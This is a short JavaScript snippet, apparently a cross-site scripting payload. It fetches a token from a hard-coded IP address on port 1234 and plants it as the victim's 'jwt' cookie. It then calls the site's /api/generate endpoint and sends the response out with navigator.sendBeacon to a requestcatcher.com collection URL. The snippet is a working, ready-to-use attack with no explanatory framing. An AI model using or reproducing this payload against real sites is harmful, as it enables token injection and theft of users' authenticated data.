navigator.sendBeacon('//stuff.requestcatcher.com/test?0');

document.cookie='jwt=';
fetch('//23.94.107.138:1234/').then((r)=>{r.text().then( async (r)=> {
    document.cookie = `jwt=${r.replace('\r', '').replace('\n', '')}; path=/`;
    fetch('/api/generate').then((r)=>{r.text().then((r)=>{
        navigator.sendBeacon('//stuff.requestcatcher.com/test?success', r);
    }).catch((r)=>{
        navigator.sendBeacon('//stuff.requestcatcher.com/test?success', r);
    })});
})});
